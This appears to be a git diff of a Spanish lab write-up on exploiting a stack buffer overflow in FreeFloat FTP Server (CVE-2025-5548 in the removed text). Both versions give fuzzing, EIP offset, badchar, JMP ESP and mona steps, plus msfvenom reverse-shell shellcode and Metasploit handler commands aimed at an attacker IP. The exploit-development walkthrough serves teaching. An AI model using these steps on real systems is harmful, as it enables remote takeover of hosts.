@@ -1,72 +1,145 @@
-# 🚀 02 - Análisis y Explotación del CVE-2025-5548
+# 🧨 Explotación de vulnerabilidad - FreeFloat FTP Server
 
-## 🎯 Objetivo de la Fase
-En esta segunda parte del laboratorio, el objetivo es materializar el riesgo del **CVE-2025-5548**. Se trata de una vulnerabilidad de **Stack Buffer Overflow** descubierta en el servidor *FreeFloat FTP* (un servicio legado de Windows). 
+## 📌 Descripción
 
-Tras analizar el binario con las herramientas preparadas en la fase anterior, descubrimos que el fallo reside en el manejador del comando `NOOP`. El servidor no valida el tamaño de la entrada antes de copiarla en la pila de memoria (Stack). Nuestro objetivo es explotar este fallo para conseguir una **Ejecución Remota de Código (RCE)**.
+En esta sección se documenta el proceso completo de explotación de una vulnerabilidad de tipo **stack buffer overflow** en el servicio FreeFloat FTP Server, dentro de un entorno de laboratorio controlado.
 
----
-
-## 🔬 Metodología de Explotación: Las 6 Fases
-
-Para desarrollar este exploit de forma controlada, he seguido el estándar de la industria, documentando cada paso del proceso:
-
-### Fase 1: Pruebas de Estabilidad (Fuzzing)
-El primer paso es comunicarnos con el puerto 21 del servidor FTP. Tras autenticarnos (o entrar como *anonymous*), enviamos el comando `NOOP` acompañado de cantidades crecientes de datos (ej. letras "A" `\x41`) hasta que el programa no puede manejar la memoria y colapsa.
-
-* **Resultado:** Descubrimos que la aplicación crashea y el registro EIP se sobrescribe con `41414141` (AAAA). Esto confirma la vulnerabilidad.
-
-> **📸 CAPTURA RECOMENDADA 1:** *Pon aquí una foto de Immunity Debugger donde se vea el programa pausado y el registro EIP lleno de 41414141.*
+El objetivo es demostrar cómo, a partir de un fallo en la gestión de memoria, es posible tomar el control del flujo de ejecución y conseguir una shell remota.
 
 ---
 
-### Fase 2: Cálculo del Offset (Control del EIP)
-Saber que el programa se rompe no es suficiente. Necesitamos saber **exactamente en qué byte** se sobrescribe el registro EIP para poder controlarlo.
+## 🧪 Entorno de laboratorio
 
-1.  Generamos un patrón cíclico único con Metasploit (`pattern_create`).
-2.  Lo enviamos a través del comando `NOOP`.
-3.  Usamos **Mona.py** dentro de Immunity Debugger para localizar el patrón: `!mona findmsp`
-
-* **Resultado:** Mona nos indica el *Offset* exacto. Es decir, el número de bytes de "basura" que debemos enviar justo antes de tocar el EIP.
-
-> **📸 CAPTURA RECOMENDADA 2:** *Foto de la consola de Mona mostrando el mensaje "EIP contains normal pattern at offset XXXX".*
-
----
-
-### Fase 3: Sobrescribir el EIP (Verificación)
-Para confirmar que tenemos el control absoluto, modificamos nuestro script en Python (`exploit.py`).
-Enviamos nuestra "basura" exacta (el Offset), seguida de cuatro letras "B" (`\x42`), y rellenamos el resto con "C"s.
-
-Si lo hemos calculado bien, el EIP debería valer exactamente `42424242`.
-
-> **📸 CAPTURA RECOMENDADA 3:** *Captura de los registros (Registers) en Immunity donde se vea claramente `EIP = 42424242`.*
+- Máquina víctima: Windows (FreeFloat FTP Server)
+- Máquina atacante: Kali Linux
+- Herramientas utilizadas:
+  - IDA Free
+  - Immunity Debugger
+  - Mona.py
+  - Python
+  - msfvenom
+  - Metasploit
 
 ---
 
-### Fase 4: Identificación de Badchars (Caracteres Malos)
-Antes de inyectar código malicioso (*Shellcode*), debemos identificar qué caracteres rompen la aplicación. Enviamos una matriz con todos los caracteres hexadecimales (del `\x01` al `\xff`).
+## 🔍 1. Análisis estático con IDA
 
-* **Resultado del Análisis:** Al comparar la memoria con Mona, identificamos que los caracteres problemáticos para este comando FTP son el byte nulo y los saltos de línea: `\x00\x0a\x0d`. Deberemos evitar que nuestro *payload* contenga estos bytes.
+Se abrió el binario del servidor FTP en IDA Free para realizar un análisis inicial del código.
+
+Para facilitar la lectura:
+- View → Open Subviews → Generate Pseudocode
+- Click derecho → Synchronize with → Pseudocode-A
+
+Se buscaron cadenas relevantes como "USER" para localizar funciones críticas.
 
 ---
 
-### Fase 5: Búsqueda del "JMP ESP" (El Trampolín)
-Como la dirección de la pila (ESP) cambia constantemente, necesitamos encontrar una instrucción dentro del programa que diga "Salta a la pila" (`JMP ESP`). 
+## ⚙️ 2. Ejecución y depuración del servicio
 
-Usamos Mona para buscar esta instrucción en un módulo del programa que no tenga protecciones modernas (como ASLR o DEP) y filtramos los *badchars* descubiertos:
+Se ejecutó el servidor FTP y se adjuntó Immunity Debugger al proceso:
 
-!mona jmp -r esp -cpb "\x00\x0a\x0d"
+File → Attach → seleccionar proceso → Enter
 
-Resultado: Encontramos una dirección de retorno válida. Al poner esta dirección en el EIP (escrita al revés por la arquitectura Little Endian), el programa saltará a nuestro código inyectado.
+Se reanudó la ejecución con el botón Play.
 
-### Fase 6: Generación de la Carga (Payload) y Ejecución
-Llegamos a la fase final. Utilizamos Msfvenom para generar un Shellcode que nos proporcione una conexión inversa (Reverse Shell), asegurándonos de excluir los caracteres malos:
+Se verificó el servicio con:
 
-msfvenom -p windows/shell_reverse_tcp LHOST=[TU_IP_KALI] LPORT=4444 -b "\x00\x0a\x0d" -f c
+ncat localhost 21
 
-Integramos este código en nuestro script de Python, añadimos un "colchón" de instrucciones NOP (\x90 * 16) para dar margen a la memoria, y ponemos nuestro Netcat a la escucha (nc -nlvp 4444). Lanzamos el exploit final.
+---
 
-📸 CAPTURA RECOMENDADA 4: La terminal de Kali Linux mostrando tu Netcat recibiendo la conexión, con el prompt C:\Windows\System32> confirmando el acceso total al sistema.
+## 💥 3. Fuzzing
+
+Se enviaron cadenas crecientes hasta provocar un crash.
+
+Se observó en Immunity:
+EIP = 41414141
+
+Esto confirma el desbordamiento.
+
+---
+
+## ⚙️ 4. Configuración de Mona
+
+!mona config -set workingfolder c:\mona
+
+---
+
+## 🎯 5. Control del EIP
+
+!mona pattern_create 400
+
+Se envió el patrón y se obtuvo el valor de EIP.
+
+!mona pattern_offset 41326941
+
+Resultado: 246
+
+Validación:
+EIP = 42424242
+
+---
+
+## 🚫 6. Bad Chars
+
+!mona bytearray
+
+Se comparó memoria:
+
+!mona compare -f c:\mona\bytearray.bin -a ESP
+
+Badchars detectados:
+\x00 \x0A \x0D
+
+---
+
+## 🔁 7. JMP ESP
+
+!mona asm -s "jmp esp"
+Resultado: \xff\xe4
+
+!mona find -s "\xff\xe4" -cpb "\x00\x0A\x0D"
+
+Se seleccionó una dirección válida.
+
+---
+
+## 🧪 8. Validación
+
+Se verificó que el flujo llegaba a la pila correctamente.
+
+---
+
+## 💣 9. Shellcode
+
+msfvenom -p windows/shell_reverse_tcp LHOST=TU_IP LPORT=443 -f python -b "\x00\x0a\x0d"
+
+---
+
+## 🎯 10. Explotación final
+
+Metasploit:
+
+use exploit/multi/handler
+set payload windows/shell_reverse_tcp
+set LHOST TU_IP
+set LPORT 443
+exploit
+
+Se obtuvo shell remota.
+
+---
+
+## ✅ Conclusión
+
+Se ha conseguido:
+
+- Control del EIP
+- Redirección del flujo
+- Ejecución remota de comandos
+
+Laboratorio realizado en entorno controlado con fines educativos.
+
 
 ### 🛡️ Conclusiones y Defensa
 Explotar el CVE-2025-5548 en un laboratorio nos enseña por qué las vulnerabilidades de corrupción de memoria son tan críticas.
